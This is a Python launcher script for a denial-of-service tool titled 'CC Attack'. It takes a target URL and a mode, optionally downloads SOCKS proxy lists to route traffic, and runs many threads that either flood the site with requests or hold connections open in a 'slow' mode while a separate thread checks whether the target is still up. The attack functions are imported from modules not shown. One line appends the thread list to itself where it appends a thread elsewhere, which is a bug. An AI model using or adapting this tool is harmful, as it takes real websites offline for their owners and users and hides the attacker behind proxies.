import argparse
from threading import Thread
from multiprocessing import Manager
from cc_fun import send_request, slow, check
from socks_proxy_getter import download_socks

parser = argparse.ArgumentParser(prog="CC Attack")
parser.add_argument('mode', type=str, nargs=1)
parser.add_argument('url', type=str, nargs=1)
parser.add_argument('--thread_num', type=int, nargs='?', default=10)
parser.add_argument('--download_socks_version', type=int, nargs='?', default=0)

manager = Manager()
stop = manager.Value('c_bool', False)


def main():
    run_args = parser.parse_args()
    mode = run_args.mode[0]
    url = run_args.url[0]
    thread_num = run_args.thread_num
    socks_version = run_args.download_socks_version
    if socks_version:
        download_socks(socks_version)
    th_list = []
    th = Thread(target=check, args=(url, stop))
    th_list.append(th)
    th.start()
    for _ in range(thread_num):
        th = Thread(target=run, args=(mode, url, stop))
        th_list.append(th_list)
        th.start()

    for th in th_list:
        th.join()


def run(mode: str, url: str, stop=False):
    try:
        _run(mode, url, stop)
    except KeyboardInterrupt:
        stop.value = True


def _run(mode: str, url: str, stop=False):
    if mode == 'slow':
        slow(url, stop, None)
    else:
        send_request(mode, url, stop, None)


if __name__ == '__main__':
    main()
